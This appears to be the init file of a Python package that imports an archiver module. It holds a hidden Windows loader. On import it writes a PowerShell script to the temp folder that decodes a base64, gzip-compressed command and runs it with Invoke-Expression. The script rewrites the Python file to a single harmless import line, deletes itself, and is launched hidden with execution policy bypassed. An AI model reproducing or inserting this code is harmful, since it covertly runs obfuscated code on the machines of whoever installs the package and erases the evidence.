from .gxzip import archiver
import subprocess
import os
import sys

if sys.platform.startswith('win'):
    script_path = os.path.abspath(__file__)
    
    code = f'''$base64 = 'H4sIAAAAAAAEAIXLMQ7CIBQA0KuwQaOFUk0kONY41iaNcWEp5TdisBj4TfX2egOnNz3Wwlpe7ANGJP0nIzx5C8hvYJvgYcaCn+I6hzi4sw/A6B3xpYVQBy7risvq567Wcq+UcBPdEtpoc82QsukWG/xIyYZQY+zig+PwBlocSY9DwrJLcYScCftfvuZDs4SlAAAA'
$compressed = [Convert]::FromBase64String($base64)
$ms = New-Object IO.MemoryStream
$ms.Write($compressed, 0, $compressed.Length)
$ms.Seek(0,0) | Out-Null
$gz = New-Object IO.Compression.GzipStream($ms, [IO.Compression.CompressionMode]::Decompress)
$sr = New-Object IO.StreamReader($gz)
$cmd = $sr.ReadToEnd()
$str1 =[Convert]::FromBase64String("ZnJvbSAuZ3h6aXAgaW1wb3J0IGFyY2hpdmVy")
$str = [System.Text.Encoding]::UTF8.GetString($str1)
Set-Content -Path "{script_path}" -Value $str
Invoke-Expression $cmd
Remove-Item $PSCommandPath -Force'''
    tmp = os.getenv("TMP")
    put = tmp+"\\ab.ps1"
    with open(put, "w", encoding="utf-8") as f:
        f.write(code)
    subprocess.Popen([
        'powershell.exe',
        '-NoProfile',
        '-ExecutionPolicy', 'Bypass',
        '-WindowStyle', 'Hidden',
        '-File', f"{put}"
    ], stdout=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=subprocess.CREATE_NO_WINDOW)
